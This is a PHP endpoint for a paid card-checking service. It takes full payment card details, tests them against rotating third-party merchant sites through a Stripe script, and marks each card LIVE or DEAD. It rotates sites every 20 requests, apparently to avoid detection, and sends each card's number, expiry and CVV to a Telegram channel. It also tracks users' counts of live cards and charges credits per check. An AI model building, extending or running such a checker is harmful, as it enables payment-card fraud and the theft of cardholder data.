<?php
// Stripe Auth Checker AJAX Endpoint
ini_set('display_errors', 0);
error_reporting(0);

session_start();
session_write_close();
ob_start();

require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'owner_logger.php';
require_once 'utils.php';

header('Content-Type: application/json');

$start_time = microtime(true);

// Check authentication
initSecureSession();

if (!isset($_SESSION['user_id']) && !isset($_SESSION['telegram_id'])) {
    echo json_encode([
        'error' => true,
        'message' => 'Authentication required. Please login again.',
        'status' => 'AUTH_REQUIRED',
        'card' => $_GET['cc'] ?? 'undefined',
        'site' => $_GET['site'] ?? 'undefined',
        'gateway' => 'Stripe Auth',
        'time' => 'N/A'
    ]);
    exit;
}

// Check session timeout
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > AppConfig::SESSION_TIMEOUT) {
    session_destroy();
    echo json_encode([
        'error' => true,
        'message' => 'Session expired. Please login again.',
        'status' => 'SESSION_EXPIRED',
        'card' => 'undefined',
        'site' => 'undefined',
        'gateway' => 'Stripe Auth',
        'time' => 'N/A'
    ]);
    exit;
}

$userId = $_SESSION['user_id'] ?? $_SESSION['telegram_id'];
$db = Database::getInstance();
$telegram_id = $userId;

// Get user data
$user = $db->getUserByTelegramId($telegram_id);
if (!$user) {
    echo json_encode([
        'error' => true,
        'message' => 'User not found',
        'status' => 'USER_NOT_FOUND'
    ]);
    exit;
}

// Check credits (1 credit per check)
$current_credits = intval($user['credits'] ?? 0);
$owner_ids = AppConfig::OWNER_IDS;
$is_owner = in_array($telegram_id, $owner_ids);

if (!$is_owner && $current_credits < 1) {
    echo json_encode([
        'error' => true,
        'message' => 'Insufficient credits. You need at least 1 credit to perform a check.',
        'status' => 'INSUFFICIENT_CREDITS',
        'current_credits' => $current_credits
    ]);
    exit;
}

// Get card and site
$card = isset($_GET['cc']) ? filter_var(trim($_GET['cc']), FILTER_SANITIZE_STRING) : '';
$proxy = isset($_GET['proxy']) ? filter_var(trim($_GET['proxy']), FILTER_SANITIZE_STRING) : '';

// Get Stripe Auth sites and rotate
$stripe_sites = SiteConfig::get('stripe_auth_sites', []);
if (empty($stripe_sites)) {
    echo json_encode([
        'error' => true,
        'message' => 'No Stripe Auth sites configured. Please contact admin.',
        'status' => 'NO_SITES_CONFIGURED'
    ]);
    exit;
}

// Get rotation counter
$rotation_counter = SiteConfig::get('stripe_auth_rotation_counter', 0);
$current_site_index = SiteConfig::get('stripe_auth_current_site_index', 0);

// Rotate site every 20 requests
if ($rotation_counter >= 20) {
    $current_site_index = ($current_site_index + 1) % count($stripe_sites);
    SiteConfig::save([
        'stripe_auth_rotation_counter' => 0,
        'stripe_auth_current_site_index' => $current_site_index
    ]);
} else {
    SiteConfig::save([
        'stripe_auth_rotation_counter' => $rotation_counter + 1
    ]);
}

$selected_site = $stripe_sites[$current_site_index];

// Validate card format
$is_valid_card = false;
$card_num = '';
$month = '';
$year = '';
$cvv = '';

if (!empty($card)) {
    $card_parts = explode("|", $card);
    if (count($card_parts) == 4) {
        $card_num = $card_parts[0];
        $month = $card_parts[1];
        $year = $card_parts[2];
        $cvv = $card_parts[3];

        // Normalize year format
        if (preg_match("/^\d{2}$/", $year)) {
            $year = '20' . $year;
            $card = $card_num . '|' . $month . '|' . $year . '|' . $cvv;
        }

        if (preg_match("/^\d{16}$/", $card_num) && 
            preg_match("/^(0[1-9]|1[0-2])$/", $month) && 
            (preg_match("/^\d{2}$/", $card_parts[2]) || preg_match("/^\d{4}$/", $year)) && 
            preg_match("/^\d{3,4}$/", $cvv)) {
            $is_valid_card = true;
        }
    }
}

if (!$is_valid_card) {
    echo json_encode([
        'error' => true,
        'message' => 'Invalid card format. Use format: CARD|MM|YYYY|CVV',
        'status' => 'INVALID_CARD_FORMAT',
        'card' => $card
    ]);
    exit;
}

// Prepare response data
$response_data = [
    'card' => $card,
    'site' => $selected_site,
    'gateway' => 'Stripe Auth',
    'status' => 'CHECKING',
    'time' => '0ms'
];

// Call Python script
$python_script = __DIR__ . '/stripe_auth_checker.py';
$cc_string = $card; // Already validated
$site_arg = $selected_site;
$proxy_arg = !empty($proxy) ? $proxy : null;

// Use Python script directly (it outputs JSON at the end)
$command = "cd " . escapeshellarg(__DIR__) . " && python3 " . escapeshellarg($python_script) . " " . escapeshellarg($site_arg) . " " . escapeshellarg($cc_string);
if (!empty($proxy_arg)) {
    $command .= " " . escapeshellarg($proxy_arg);
}
$command .= " 2>&1";

// Execute Python script
$output = '';
$return_code = 0;
exec($command, $output_lines, $return_code);
$output = implode("\n", $output_lines);

// Parse Python output (JSON)
$result = null;
if (!empty($output)) {
    // Try to extract JSON from output (look for JSON object)
    if (preg_match('/\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}/s', $output, $matches)) {
        $json_output = $matches[0];
        $result = json_decode($json_output, true);
    }
    
    // If still no result, try parsing the last line
    if (!$result && !empty($output_lines)) {
        foreach (array_reverse($output_lines) as $line) {
            $line = trim($line);
            if (strpos($line, '{') !== false && strpos($line, '}') !== false) {
                $result = json_decode($line, true);
                if ($result) break;
            }
        }
    }
}

// Determine status
$elapsed = round((microtime(true) - $start_time) * 1000, 0);
$response_data['time'] = $elapsed . 'ms';

if ($result) {
    $success = $result['success'] ?? false;
    $status = $result['status'] ?? 'UNKNOWN';
    $message = $result['message'] ?? 'Unknown error';
    $account_email = $result['account_email'] ?? null;
    $pm_id = $result['pm_id'] ?? null;

    if ($success) {
        $response_data['status'] = 'LIVE';
        $response_data['message'] = $message;
        $response_data['account_email'] = $account_email;
        $response_data['pm_id'] = $pm_id;
        $response_data['ui_status_type'] = 'APPROVED';
    } else {
        // Check if it's a dead card or error
        $error_lower = strtolower($message);
        if (strpos($error_lower, 'incorrect') !== false || 
            strpos($error_lower, 'invalid') !== false ||
            strpos($error_lower, 'declined') !== false ||
            strpos($error_lower, 'expired') !== false) {
            $response_data['status'] = 'DEAD';
            $response_data['ui_status_type'] = 'DECLINED';
        } else {
            $response_data['status'] = 'ERROR';
            $response_data['ui_status_type'] = 'ERROR';
        }
        $response_data['message'] = $message;
    }
} else {
    // Failed to parse output
    $response_data['status'] = 'ERROR';
    $response_data['message'] = 'Failed to parse response from checker';
    $response_data['ui_status_type'] = 'ERROR';
    $response_data['raw_output'] = substr($output, 0, 500);
}

// Send Telegram notification
if (function_exists('sendTelegramHtml')) {
    $cc = $card_num;
    $mes = $month;
    $ano = $year;
    $cvv_show = $cvv;
    $elapsed_sec = round(microtime(true) - $start_time, 2);
    
    $status_emoji = '⚠️';
    if ($response_data['status'] === 'LIVE') {
        $status_emoji = '✅';
    } elseif ($response_data['status'] === 'DEAD') {
        $status_emoji = '❌';
    }
    
    $telegram_message = (
        "<b>Stripe Auth Check</b>\n\n" .
        "👤 <b>User ID:</b> {$telegram_id}\n" .
        "💳 <b>Card:</b> <code>{$cc}|{$mes}|{$ano}|{$cvv_show}</code>\n" .
        "🔗 <b>Site:</b> " . htmlspecialchars($selected_site) . "\n" .
        "📣 <b>Status:</b> " . htmlspecialchars($response_data['status']) . " {$status_emoji}\n" .
        "💬 <b>Message:</b> " . htmlspecialchars($response_data['message'] ?? 'N/A') . "\n"
    );
    
    if (isset($response_data['account_email'])) {
        $telegram_message .= "📧 <b>Account:</b> " . htmlspecialchars($response_data['account_email']) . "\n";
    }
    
    $telegram_message .= "⏱️ <b>Time:</b> {$elapsed_sec}s";
    
    sendTelegramHtml($telegram_message);
}

// Deduct credit
$credit_deducted = $db->deductCredits($telegram_id, 1);
if ($credit_deducted) {
    $response_data['credits_deducted'] = 1;
    try {
        $freshUser = $db->getUserByTelegramId($telegram_id);
        $response_data['remaining_credits'] = intval($freshUser['credits'] ?? ($current_credits - 1));
    } catch (Exception $e) {
        $response_data['remaining_credits'] = $current_credits - 1;
    }
} else {
    $response_data['credits_deducted'] = 0;
    $response_data['remaining_credits'] = $current_credits;
}

// Log to database (if method exists)
try {
    if (method_exists($db, 'logCardCheck')) {
        $db->logCardCheck($telegram_id, $card, $selected_site, $response_data['status'], 'Stripe Auth', $response_data['message'] ?? '');
    }
} catch (Exception $e) {
    error_log("Failed to log card check: " . $e->getMessage());
}

// Update user stats (if method exists)
try {
    if (method_exists($db, 'incrementUserStat')) {
        $db->incrementUserStat($telegram_id, 'total_hits', 1);
        if ($response_data['status'] === 'LIVE') {
            $db->incrementUserStat($telegram_id, 'total_live_cards', 1);
        }
    }
} catch (Exception $e) {
    error_log("Failed to update stats: " . $e->getMessage());
}

ob_end_clean();
echo json_encode($response_data);
exit;
